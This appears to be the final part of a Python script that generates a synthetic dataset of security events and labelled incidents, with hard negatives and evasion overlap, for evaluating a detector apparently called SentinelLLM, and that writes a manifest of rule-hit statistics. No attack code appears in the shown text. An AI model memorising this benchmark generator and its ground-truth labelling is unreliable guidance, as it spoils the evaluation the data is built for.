            "schema_version": SCHEMA_VERSION,
            "incident_id": incident_id,
            "host": b.host,
            "start_time": b.events[0]["timestamp"],
            "end_time": b.events[-1]["timestamp"],
            "event_ids": [e["event_id"] for e in b.events],
            "rule_hits": sorted(b.rule_hits),
            "label": meta["label"],
            "scenario_family": family,
            "scenario_variant": meta["variant"],
            "is_hard_negative": bool(meta.get("hard", False)),
            "ground_truth_stages": sorted(b.stages),
            "provenance": {"source": "synthetic", "generator_version": GENERATOR_VERSION, "seed": seed},
        })
        events_out.extend(b.events)

    out_dir.mkdir(parents=True, exist_ok=True)
    with (out_dir / "events.jsonl").open("w") as f:
        for e in events_out:
            f.write(json.dumps(e) + "\n")
    with (out_dir / "incidents.jsonl").open("w") as f:
        for inc in incidents_out:
            f.write(json.dumps(inc) + "\n")

    label_counts = Counter(i["label"] for i in incidents_out)
    family_counts = Counter(i["scenario_family"] for i in incidents_out)
    hard = sum(1 for i in incidents_out if i["is_hard_negative"])
    # How many benign incidents fire at least one rule - the rules-only FP ceiling.
    benign_with_rules = sum(1 for i in incidents_out if i["label"] == "benign" and i["rule_hits"])
    malicious_no_rules = sum(1 for i in incidents_out
                             if i["label"] == "malicious" and not i["rule_hits"])
    n_mal = sum(1 for i in incidents_out if i["label"] == "malicious")
    n_ben = sum(1 for i in incidents_out if i["label"] == "benign")
    manifest = {
        "generator_version": GENERATOR_VERSION,
        "schema_version": SCHEMA_VERSION,
        "seed": seed,
        "ambiguity": ambiguity,
        "n_incidents": len(incidents_out),
        "n_events": len(events_out),
        "labels": dict(label_counts),
        "families": dict(family_counts),
        "hard_negatives": hard,
        "benign_incidents_firing_rules": benign_with_rules,
        "benign_rule_fire_rate": round(benign_with_rules / n_ben, 3) if n_ben else 0.0,
        "malicious_incidents_firing_no_rules": malicious_no_rules,
        "malicious_rule_miss_rate": round(malicious_no_rules / n_mal, 3) if n_mal else 0.0,
        "rule_definitions": RULES,
    }
    (out_dir / "manifest.json").write_text(json.dumps(manifest, indent=2) + "\n")
    return manifest


def main() -> None:
    p = argparse.ArgumentParser(description="Generate synthetic SentinelLLM events.")
    p.add_argument("--n-incidents", type=int, default=400)
    p.add_argument("--seed", type=int, default=7)
    p.add_argument("--out", type=Path, default=Path("data_synthetic/v1"))
    p.add_argument("--ambiguity", type=float, default=1.0,
                   help="0 = clean/separable families, 1 = full evasion overlap. "
                        "Lower values are useful for debugging, not for reporting.")
    a = p.parse_args()
    m = generate(a.n_incidents, a.seed, a.out, a.ambiguity)
    print(json.dumps(m, indent=2))


if __name__ == "__main__":
    main()
